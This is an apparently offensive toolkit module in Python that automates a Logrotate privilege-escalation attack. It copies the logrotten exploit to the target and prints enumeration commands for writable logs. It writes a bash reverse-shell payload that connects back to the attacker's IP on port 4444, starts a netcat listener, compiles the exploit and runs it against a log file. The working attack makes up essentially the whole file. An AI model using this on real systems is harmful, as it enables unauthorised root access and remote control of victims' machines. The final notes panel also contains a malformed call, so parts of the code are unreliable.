from pathlib import Path
import subprocess

from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

from core.attacker import get_ip
from core.paths import get_tools_dir
from modules.upload.linux import stage_linux_files

console = Console()


def start_listener(port=4444):
    try:
        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"bash -c 'nc -lvnp {port}; exec bash'"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        console.print(
            f"[green][+] Started Netcat listener on port {port}[/green]"
        )

    except Exception as e:

        console.print(
            f"[red][-] Failed to start listener: {e}[/red]"
        )


def run(data, cred, args):

    console.print(
        Panel.fit(
            "[bold cyan]Logrotate Privilege Escalation[/bold cyan]\n\n"
            "[white]Requirements:[/white]\n"
            " • Writable log file\n"
            " • Vulnerable logrotate version\n"
            " • Logrotate executed as root",
            border_style="cyan"
        )
    )

    #
    # Transfer logrotten
    #
    choice = (
        input(
            "\nTransfer logrotten to target? [Y/n]: "
        )
        .strip()
        .lower()
    )

    if choice in ("", "y", "yes"):
        tools = get_tools_dir()
        stage_linux_files(
            [
                tools / "logrotten.c"
            ]
        )

    #
    # Enumeration
    #
    commands = r"""# ==========================================
# Verify configuration
# ==========================================

grep "create\|compress" /etc/logrotate.conf | grep -v "#"

cat /etc/logrotate.conf


# ==========================================
# Writable log files
# ==========================================

find /var/log \
    -type f \
    -writable \
    2>/dev/null


# ==========================================
# Check scheduled execution
# ==========================================

grep -R logrotate /etc/cron* 2>/dev/null
"""

    console.print(
        Panel.fit(
            "Enumeration",
            border_style="yellow"
        )
    )

    console.print(
        Syntax(
            commands,
            "bash",
            theme="monokai"
        )
    )

    #
    # Payload
    #
    ip = get_ip() or "<ATTACKER-IP>"

    payload = f"""echo 'bash -i >& /dev/tcp/{ip}/4444 0>&1' > payload

chmod +x payload
"""

    console.print(
        Panel.fit(
            "Payload",
            border_style="green"
        )
    )

    console.print(
        Syntax(
            payload,
            "bash",
            theme="monokai"
        )
    )

    #
    # Compile logrotten
    #
    compile = """gcc logrotten.c -o logrotten && chmod +x logrotten
    """

    console.print(
        Panel.fit(
            "Compile",
            border_style="blue"
        )
    )

    console.print(
        Syntax(
            compile,
            "bash",
            theme="monokai"
        )
    )

    #
    # Listener
    #
    start_listener()

    
    #
    # Exploit (replace '/tmp/tmp.log' to the path to the log. Always use full path)
    #
    exploit = r"""
    ./logrotten -p ./payload /tmp/tmp.log
"""

    console.print(
        Panel.fit(
            "Exploit",
            border_style="red"
        )
    )

    console.print(
        Syntax(
            exploit,
            "bash",
            theme="monokai"
        )
    )

    console.print(
        Panel.fit(
            "[bold yellow]Notes[/bold yellow]\n\n"
            "• Writable log file required.\n"
            "• Logrotate must execute as root.\n"
            "• Determine whether the configuration uses 'create' or 'compress'.\n"
            "• Wait for the next scheduled rotation or trigger one manually if possible.",
            "• To trigger, write to lo log file (echo test >> tmp.log) and wait 30-60s.",
            title="Tips",
            border_style="yellow"
        )
    )
